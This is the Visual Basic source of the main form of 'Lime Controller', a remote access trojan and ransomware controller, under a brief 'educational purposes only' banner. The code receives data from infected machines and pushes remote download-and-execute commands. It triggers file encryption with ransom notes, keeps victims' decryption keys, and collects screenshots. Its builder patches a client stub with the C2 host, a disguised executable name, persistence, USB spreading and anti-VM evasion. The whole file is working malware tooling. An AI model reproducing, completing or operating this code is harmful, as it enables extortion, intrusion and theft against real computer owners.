
'##################################################################
'##           N Y A N   C A T  ||  Last edit MAR./09/2018        ##
'##################################################################
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##            ░░░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░           ##
'##            ░░░░░░░░▄▀░░░░░░░░░░░░▄░░░░░░░▀▄░░░░░░░           ##
'##            ░░░░░░░░█░░▄░░░░▄░░░░░░░░░░░░░░█░░░░░░░           ##
'##            ░░░░░░░░█░░░░░░░░░░░░▄█▄▄░░▄░░░█░▄▄▄░░░           ##
'##            ░▄▄▄▄▄░░█░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██░░           ##
'##            ░██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██░░           ##
'##            ░░▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██░           ##
'##            ░░░░▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██░           ##
'##            ░░░░░░░▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██░           ##
'##            ░░░░░░░▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀░░           ##
'##            ░░░░░░█▀▀█████████▀▀▀▀████████████▀░░░░           ##
'##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
'##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
'##                                                              ##
'##                  .. Lime Controller v0.4 ..                  ##
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##################################################################
'##    This project was created for educational purposes only    ##
'##################################################################



Imports Mono.Cecil
Imports Mono.Cecil.Cil

Public Class Form1

    Public Shared F As Form1
    Public Shared SPL As String = "'L'"
    Public Shared LIST_ITEMS As New List(Of String)
    Public cc As New CL
    Private m_SortingColumn As ColumnHeader
    Private Shared noti As New NotifyIcon


#Region "Events"

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        TOS.ShowDialog()
        SelPORT.ShowDialog()

        Try
            Control.CheckForIllegalCrossThreadCalls = False
            F = Me
            cc.Start(SelPORT.Myport)
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical, Nothing)
            End
        End Try

        Try
            If Not IO.Directory.Exists(Application.StartupPath + "\Stub") Then
                IO.Directory.CreateDirectory(Application.StartupPath + "\Stub")
            End If
        Catch ex As Exception
        End Try


        Try
            Me.Text = "Lime Controller v0.4"

            Me.port.Text = SelPORT.Myport
            exename.Enabled = False
            DRPATH.Enabled = False
            CHKDR.Checked = False
            DRFOLDER.Enabled = False

            noti.Visible = True
            noti.Icon = Me.Icon
        Catch ex As Exception
        End Try


        Try
            Messages("Connection", "Established!")
        Catch ex As Exception
        End Try

        Dim Xpos As Integer
        Dim ypos As Integer
        Xpos = (F.Width / 1.2) - (PictureBox1.Width / 2)
        ypos = (F.Height / 1.6) - (PictureBox1.Height / 2)
        Me.PictureBox1.Location = New Drawing.Point(Xpos, ypos)

        Fix()


    End Sub



    Private Sub Form1_Closing(sender As Object, e As System.ComponentModel.CancelEventArgs) Handles MyBase.Closing
        On Error Resume Next
        noti.Dispose()
        End
    End Sub

#End Region


#Region "receiving"
    Delegate Sub _DT(ByVal C As C, ByVal B() As Byte)
    Sub DT(ByVal C As C, ByVal B() As Byte)

        Dim A() As String = Strings.Split(FN.GS(B), SPL)
        On Error Resume Next
        Select Case A(0)
            Case "INFO"

                Threading.Monitor.Enter(F.L1.Items)
                For I As Integer = 0 To A.Count - 1
                    LIST_ITEMS.Add(A(I))
                Next


                C.L = F.L1.Items.Add(LIST_ITEMS(1))
                C.L.SubItems.Add(C.ip)
                C.L.SubItems.Add(LIST_ITEMS(2))
                C.L.SubItems.Add(LIST_ITEMS(3))
                C.L.SubItems.Add(LIST_ITEMS(4))
                C.L.SubItems.Add(LIST_ITEMS(5))
                C.L.SubItems.Add(LIST_ITEMS(6))
                C.L.SubItems.Add(LIST_ITEMS(7))
                C.L.SubItems.Add(LIST_ITEMS(8))
                C.L.SubItems.Add(LIST_ITEMS(9))
                C.L.SubItems.Add(LIST_ITEMS(10))

                C.L.Tag = C
                LIST_ITEMS.Clear()
                Threading.Monitor.Exit(F.L1.Items)
                Fix()
                Messages("{" + C.L.SubItems(0).Text + "}" + " " + "{" + C.L.SubItems(2).Text + "}", "Connected")

                noti.BalloonTipIcon = ToolTipIcon.Info
                noti.BalloonTipTitle = "Lime Controller | New Connection"
                noti.BalloonTipText = "IP: " + C.L.SubItems(1).Text + vbNewLine + "Username: " + C.L.SubItems(2).Text + vbNewLine
                noti.ShowBalloonTip(600)
                Return

            Case "MSG"
                For Each L As ListViewItem In F.L1.Items
                    If L.SubItems(1).Text = C.ip Then
                        Messages("{" + L.SubItems(0).Text + "}" + " " + "{" + L.SubItems(2).Text + "}", A(1).ToString)
                        Exit For
                    End If
                Next


            Case "Details"

                If F.InvokeRequired Then
                    F.Invoke(New _DT(AddressOf DT), C, B)
                    Exit Sub
                End If

                Dim D As Details = My.Application.OpenForms("Details" & C.ip)
                If D Is Nothing Then
                    D = New Details
                    D.Name = "Details" + C.ip
                    D.F = F
                    D.C = C
                    D.Show()
                End If

                D.ListView1.Items.Clear()

                D.ListView1.Columns.Add("")
                D.ListView1.Columns.Add("")

                D.ListView1.Items.Add("ID").SubItems.Add(A(1))
                D.ListView1.Items.Add("User").SubItems.Add(A(2))
                D.ListView1.Items.Add("Current Connection").SubItems.Add(A(11))
                D.ListView1.Items.Add("Stub").SubItems.Add(A(3))
                D.ListView1.Items.Add("CPU").SubItems.Add(A(4))
                D.ListView1.Items.Add("GPU").SubItems.Add(A(5))
                D.ListView1.Items.Add("Privilege").SubItems.Add(A(6))
                D.ListView1.Items.Add("Machine Type").SubItems.Add(A(7))
                D.ListView1.Items.Add("Current Time").SubItems.Add(A(8))
                D.ListView1.Items.Add("Drivers List").SubItems.Add(A(9))
                D.ListView1.Items.Add("Last reboot").SubItems.Add(A(10))
                D.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)

            Case "Processes"
                Dim D As Details = My.Application.OpenForms("Details" & C.ip)
                D.ListView2.Items.Clear()
                For i As Integer = 1 To A.Length - 1
                    Dim x As String() = Split(A(i), "|LIME|")
                    D.ListView2.Items.Add(x(0)).SubItems.Add(x(1))
                Next
                D.ListView2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)

            Case "GET-KEY"
                If Not IO.Directory.Exists("Users" & "\" & A(1)) Then
                    IO.Directory.CreateDirectory("Users" & "\" & A(1))
                End If
                IO.File.WriteAllText("Users" & "\" & A(1) + "\" & "KEY.txt", A(2))

            Case "DEL-KEY"
                IO.File.Delete("Users" & "\" & A(1) + "\" & "KEY.txt")

            Case "c_ransome"
                C.L.SubItems(3).Text = A(1)
                Fix()

            Case "SC"
                IO.File.WriteAllBytes("Users" & "\" & A(1) + "\" & "SC.jpeg", Convert.FromBase64String(A(2)))
                Process.Start("Users" & "\" & A(1) + "\" & "SC.jpeg")
        End Select

    End Sub
#End Region


#Region "Sending"

    Private Sub FromDiskToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FromDiskToolStripMenuItem1.Click

        Try
            Dim o As New OpenFileDialog
            With o
                .Filter = "All Type (*.*)|*.*"
                .Title = "Select a File"
            End With

            If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                For Each l As ListViewItem In Me.L1.SelectedItems
                    Dim C As C = CType(l.Tag, C)
                    C.SendText("RunDisk" & SPL & o.FileName & SPL & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
                Next
            End If
        Catch ex As Exception
        End Try

    End Sub


    Private Sub FromURLToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FromURLToolStripMenuItem1.Click
        Try
            Dim URL As String = InputBox("Enter the direct link", "Run File", "http://site.com/file.exe")
            If String.IsNullOrEmpty(URL) Then
                Exit Sub
            Else
                For Each l As ListViewItem In Me.L1.SelectedItems
                    Dim C As C = CType(l.Tag, C)
                    C.SendText("RunURL" & SPL & URL)
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub FromDiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromDiskToolStripMenuItem.Click
        Try
            Dim o As New OpenFileDialog
            With o
                .Filter = ".exe (*.exe)|*.exe"
                .Title = "UPDATE"
            End With

            If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                For Each l As ListViewItem In Me.L1.SelectedItems
                    Dim C As C = CType(l.Tag, C)
                    C.SendText("RunDisk" & SPL & o.FileName & SPL & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)) & SPL & "update")
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub FromURLToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromURLToolStripMenuItem.Click
        Try
            Dim URL As String = InputBox("Enter the direct link", "UPDATE", "http://site.com/file.exe")
            If String.IsNullOrEmpty(URL) Then

                Exit Sub
            Else
                For Each l As ListViewItem In Me.L1.SelectedItems
                    Dim C As C = CType(l.Tag, C)
                    C.SendText("RunURL" & SPL & URL & SPL & "update")
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub RestartToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RestartToolStripMenuItem1.Click
        For Each l As ListViewItem In Me.L1.SelectedItems
            Dim C As C = CType(l.Tag, C)
            C.SendText("Reconnect")
        Next
    End Sub

    Private Sub UninstallToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UninstallToolStripMenuItem1.Click
        For Each l As ListViewItem In Me.L1.SelectedItems
            Dim C As C = CType(l.Tag, C)
            C.SendText("Uni")
        Next
    End Sub

    Private Sub CloseToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CloseToolStripMenuItem.Click
        For Each l As ListViewItem In Me.L1.SelectedItems
            Dim C As C = CType(l.Tag, C)
            C.SendText("Close")
        Next
    End Sub

    Private Sub LogoffToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles LogoffToolStripMenuItem.Click
        For Each l As ListViewItem In Me.L1.SelectedItems
            Dim C As C = CType(l.Tag, C)
            C.SendText("Logoff")
        Next
    End Sub

    Private Sub ToolStripMenuItem3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem3.Click
        For Each l As ListViewItem In Me.L1.SelectedItems
            Dim C As C = CType(l.Tag, C)
            C.SendText("Restart")
        Next
    End Sub

    Private Sub ShutdownToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ShutdownToolStripMenuItem.Click
        For Each l As ListViewItem In Me.L1.SelectedItems
            Dim C As C = CType(l.Tag, C)
            C.SendText("Shutdown")
        Next
    End Sub

    Private Sub DetailsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DetailsToolStripMenuItem.Click
        For Each l As ListViewItem In Me.L1.SelectedItems
            Dim C As C = CType(l.Tag, C)
            C.SendText("Details")
        Next
    End Sub

    Private Sub EncryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EncryptToolStripMenuItem.Click
        Try
            Dim R As New Ransomware
            R.ShowDialog()

            If R.OK = True Then

                For Each l As ListViewItem In Me.L1.SelectedItems
                    Dim C As C = CType(l.Tag, C)
                    C.SendText("Ransom" + SPL + R.RichTextBox1.Text + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(R.o.FileName)))

                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub DecryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DecryptToolStripMenuItem.Click
        Try
            For Each l As ListViewItem In Me.L1.SelectedItems
                Dim C As C = CType(l.Tag, C)
                C.SendText("Ransom-DEC" + SPL + IO.File.ReadAllText("USERS" + "\" + C.L.SubItems(2).Text + "_" + C.L.SubItems(0).Text + "\Key.txt"))
            Next
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub VisitWebsiteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles VisitWebsiteToolStripMenuItem.Click
        Dim URL As String = InputBox("", "Visit Website", "https://google.com")
        For Each l As ListViewItem In Me.L1.SelectedItems
            Dim C As C = CType(l.Tag, C)
            C.SendText("VisitURL" + SPL + URL)
        Next
    End Sub

#End Region


#Region "Builder"
    Private Sub Button1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Button1.Click

        If host.Text.ToLower.Contains("pastebin.com".ToLower) AndAlso Not host.Text.ToLower.Contains("/raw/".ToLower) Then
            MsgBox("Your pastebin should be like this https://pastebin.com/raw/pJS2zFAz", MsgBoxStyle.Information)
            Return
        End If

        If (exename.Text = "") Then
            exename.Text = "Wservices.exe"
        End If

        If DRPATH.Text = "" Then
            DRPATH.Text = "Temp"
        End If

        If IO.Path.GetExtension(exename.Text) <> ".exe" Then
            exename.Text = exename.Text + ".exe"
        End If

        If (DRFOLDER.Text = "") Then
            DRFOLDER.Text = Nothing
        End If

        If Not IO.File.Exists((Application.StartupPath & "\Stub\stub.exe")) Then
            Interaction.MsgBox("Stub Not Found", MsgBoxStyle.Critical, Nothing)
            Return
        ElseIf (host.Text = "") Then
            Interaction.MsgBox("Enter DNS - IP", MsgBoxStyle.Critical, Nothing)
            Return
        ElseIf (port.Text = "") Then
            Interaction.MsgBox("Enter Port", MsgBoxStyle.Critical, Nothing)
            Return
        Else
            Try
                Dim definition As AssemblyDefinition = AssemblyDefinition.ReadAssembly((Application.StartupPath & "\Stub\stub.exe"))
                Dim definition2 As ModuleDefinition
                For Each definition2 In definition.Modules
                    Dim definition3 As TypeDefinition
                    For Each definition3 In definition2.Types
                        Dim definition4 As MethodDefinition
                        For Each definition4 In definition3.Methods
                            If (definition4.IsConstructor AndAlso definition4.HasBody) Then
                                Dim enumerator As IEnumerator(Of Instruction)
                                Try
                                    enumerator = definition4.Body.Instructions.GetEnumerator
                                    Do While enumerator.MoveNext
                                        Dim current As Instruction = enumerator.Current
                                        If ((current.OpCode.Code = Code.Ldstr) And (Not current.Operand Is Nothing)) Then
                                            Dim str As String = current.Operand.ToString
                                            If (str = "%LHOST%") Then
                                                current.Operand = host.Text
                                            End If
                                            If (str = "%LPORT%") Then
                                                current.Operand = port.Text
                                            End If
                                            If (str = "%STNAME%") Then
                                                current.Operand = Randomisi(10)
                                            End If
                                            If (str = "%LEXE%") Then
                                                current.Operand = exename.Text
                                            End If
                                            If (str = "%DRPATH%") Then
                                                current.Operand = DRPATH.Text
                                            End If
                                            If (str = "%DRCHK%") Then
                                                current.Operand = CHKDR.Checked.ToString
                                            End If
                                            If (str = "%DRFOLDER%") Then
                                                current.Operand = DRFOLDER.Text
                                            End If
                                            If (str = "%SPUSB%") Then
                                                current.Operand = SPUSB.Checked.ToString
                                            End If
                                            If (str = "%ANTIV%") Then
                                                current.Operand = ANTI_VM.Checked.ToString
                                            End If
                                        End If
                                    Loop
                                Finally
                                End Try
                            End If
                        Next
                    Next
                Next

                definition.Write(Application.StartupPath + "\" + "Controller-Client.exe")
                MsgBox("Your Controller Has been Created Successfully", vbInformation, "DONE!")

            Catch ex1 As Exception
                MsgBox(ex1.Message, MsgBoxStyle.Exclamation)
                Return
            End Try
        End If

    End Sub

    Public Function Randomisi(ByVal lenght As Integer) As String
        Dim b() As Char
        Dim s As New System.Text.StringBuilder("")
        b = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()".ToCharArray()
        For i As Integer = 1 To lenght
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function

    Private Sub ChOnOffBox1_CheckedChanged(sender As Object) Handles CHKDR.CheckedChanged
        If CHKDR.Checked = True Then
            exename.Enabled = True
            DRPATH.Enabled = True
            DRFOLDER.Enabled = True
        Else
            exename.Enabled = False
            DRPATH.Enabled = False
            DRFOLDER.Enabled = False
        End If
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        MsgBox("
Pastebin URL = example https://pastebin.com/raw/PDC3d2bU it must start with https and contain /raw/

PORT = Your port. the default is 6652

Drop file = It will make sure that you client.exe will run after PC is restarted

MISC = Spreading your controller on any USB that is plugged-in, Also Anti-VM will prevent your controller to run on VMware or Sandboxie or XP machines
")
    End Sub
#End Region


#Region "Theme"

    Public Shared Sub Messages(ByVal user As String, ByVal msg As String)
        F.L2.Items.Add("[" + DateAndTime.Now.ToString("hh:mm:ss tt") + "]" + "  " + user + "  →  " + msg.ToString)
    End Sub

    Private Sub ListBox1_DrawItem(sender As System.Object, e As System.Windows.Forms.DrawItemEventArgs) Handles L2.DrawItem
        e.DrawBackground()

        If L2.Items(e.Index).ToString.Contains("Connected") Then
            e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.Lime, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))

        ElseIf L2.Items(e.Index).ToString.Contains("Disconnected") Then
            e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.Red, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))

        ElseIf L2.Items(e.Index).ToString.Contains("Error!") Then
            e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.Orange, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))

        ElseIf L2.Items(e.Index).ToString.Contains("Established!") Then
            e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.LightSteelBlue, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))
        Else
            e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.White, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))
        End If
        e.DrawFocusRectangle()

    End Sub

    Private Shared Sub Fix()
        F.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
    End Sub

    Private Sub L1_Resize(sender As Object, e As EventArgs) Handles L1.Resize
        On Error Resume Next
        Fix()
        Dim Xpos As Integer
        Dim ypos As Integer
        Xpos = (F.Width / 1.2) - (PictureBox1.Width / 2)
        ypos = (F.Height / 1.6) - (PictureBox1.Height / 2)
        Me.PictureBox1.Location = New Drawing.Point(Xpos, ypos)
    End Sub

    Private Sub ListView1_DrawColumnHeader(ByVal sender As Object, ByVal e As DrawListViewColumnHeaderEventArgs) Handles L1.DrawColumnHeader
        Using br = New Drawing.SolidBrush(Drawing.Color.Black)
            e.DrawBackground()
            e.Graphics.FillRectangle(br, e.Bounds)
            Dim headerFont As New Drawing.Font("Microsoft Sans Serif", 8, Drawing.FontStyle.Bold)
            e.Graphics.DrawString(e.Header.Text, headerFont, Drawing.Brushes.Lime, e.Bounds)
        End Using
    End Sub

    Private Sub ListView1_DrawItem(sender As Object, e As DrawListViewItemEventArgs) Handles L1.DrawItem
        e.DrawDefault = True
        If (e.ItemIndex Mod 2) = 1 Then
            e.Item.BackColor = Drawing.Color.Black
            e.Item.UseItemStyleForSubItems = True
        End If
    End Sub

    Public Function KeyCount()
        Try
            Dim Location = Application.StartupPath + "\Users"
            Dim fileEntries As String() = IO.Directory.GetFiles(Location, "KEY.txt", IO.SearchOption.AllDirectories)
            Return fileEntries.Count
        Catch ex As Exception
            Return "0"
        End Try
    End Function

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Me.ToolStripStatusLabel1.Text = "LISTENING PORT [" & SelPORT.Myport & "]        ONLINE CLIENTS [" & L1.Items.Count & "]        SELECTED CLIENTS [" & L1.SelectedItems.Count & "]        AVAILABLE KEYS TO DECRYPT [" & KeyCount() & "]"
    End Sub

    Private Sub Form1_Activated(sender As Object, e As EventArgs) Handles Me.Activated
        Opacity = 1
    End Sub

    Private Sub Form1_Deactivate(sender As Object, e As EventArgs) Handles Me.Deactivate
        Opacity = 0.8
    End Sub

    Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem.Click
        MsgBox("Coded by : NYAN CAT" + vbNewLine + vbNewLine + "https://github.com/NYAN-x-CAT/Lime-Controller")
    End Sub

    Private Sub L1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles L1.SelectedIndexChanged
        Dim x As Integer
        Try
            If L1.SelectedItems.Count > 0 Then
                For x = 0 To L1.SelectedItems.Count - 1
                    PictureBox1.ImageLocation = "Users" & "\" & L1.SelectedItems(x).SubItems(2).Text + "_" + L1.SelectedItems(x).Text + "\" & "SC.jpeg"
                    PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage
                    PictureBox1.Visible = True
                Next
            Else
                PictureBox1.Visible = False
            End If
        Catch ex As Exception
            PictureBox1.Visible = False
        End Try
    End Sub

    Private Sub L2_SelectedIndexChanged(sender As Object, e As EventArgs) Handles L2.SelectedIndexChanged
        L2.ClearSelected()
    End Sub

    Private Sub L2_Click(sender As Object, e As EventArgs) Handles L2.Click
        L2.ClearSelected()

    End Sub

    Class ListViewComparer
        Implements IComparer

        Private m_ColumnNumber As Integer
        Private m_SortOrder As SortOrder

        Public Sub New(ByVal column_number As Integer, ByVal _
            sort_order As SortOrder)
            m_ColumnNumber = column_number
            m_SortOrder = sort_order
        End Sub

        ' Compare the items in the appropriate column
        ' for objects x and y.
        Public Function Compare(ByVal x As Object, ByVal y As _
            Object) As Integer Implements _
            System.Collections.IComparer.Compare
            Dim item_x As ListViewItem = DirectCast(x,
                ListViewItem)
            Dim item_y As ListViewItem = DirectCast(y,
                ListViewItem)

            ' Get the sub-item values.
            Dim string_x As String
            If item_x.SubItems.Count <= m_ColumnNumber Then
                string_x = ""
            Else
                string_x = item_x.SubItems(m_ColumnNumber).Text
            End If

            Dim string_y As String
            If item_y.SubItems.Count <= m_ColumnNumber Then
                string_y = ""
            Else
                string_y = item_y.SubItems(m_ColumnNumber).Text
            End If

            ' Compare them.
            If m_SortOrder = SortOrder.Ascending Then
                If IsNumeric(string_x) And IsNumeric(string_y) _
                    Then
                    Return Val(string_x).CompareTo(Val(string_y))
                ElseIf IsDate(string_x) And IsDate(string_y) _
                    Then
                    Return DateTime.Parse(string_x).CompareTo(DateTime.Parse(string_y))
                Else
                    Return String.Compare(string_x, string_y)
                End If
            Else
                If IsNumeric(string_x) And IsNumeric(string_y) _
                    Then
                    Return Val(string_y).CompareTo(Val(string_x))
                ElseIf IsDate(string_x) And IsDate(string_y) _
                    Then
                    Return DateTime.Parse(string_y).CompareTo(DateTime.Parse(string_x))
                Else
                    Return String.Compare(string_y, string_x)
                End If
            End If
        End Function
    End Class

    Private Sub L1_ColumnClick(ByVal sender As System.Object, ByVal e As ColumnClickEventArgs) Handles L1.ColumnClick
        ' Get the new sorting column.
        Dim new_sorting_column As ColumnHeader = L1.Columns(e.Column)

        ' Figure out the new sorting order.
        Dim sort_order As System.Windows.Forms.SortOrder
        If m_SortingColumn Is Nothing Then
            ' New column. Sort ascending.
            sort_order = SortOrder.Ascending
        Else
            ' See if this is the same column.
            If new_sorting_column.Equals(m_SortingColumn) Then
                ' Same column. Switch the sort order.
                If m_SortingColumn.Text.StartsWith("> ") Then
                    sort_order = SortOrder.Descending
                Else
                    sort_order = SortOrder.Ascending
                End If
            Else
                ' New column. Sort ascending.
                sort_order = SortOrder.Ascending
            End If

            ' Remove the old sort indicator.
            m_SortingColumn.Text =
                m_SortingColumn.Text.Substring(2)
        End If

        ' Display the new sort order.
        m_SortingColumn = new_sorting_column
        If sort_order = SortOrder.Ascending Then
            m_SortingColumn.Text = "> " & m_SortingColumn.Text
        Else
            m_SortingColumn.Text = "< " & m_SortingColumn.Text
        End If

        ' Create a comparer.
        L1.ListViewItemSorter = New ListViewComparer(e.Column, sort_order)

        ' Sort.
        L1.Sort()
        Fix()
    End Sub

#End Region


End Class
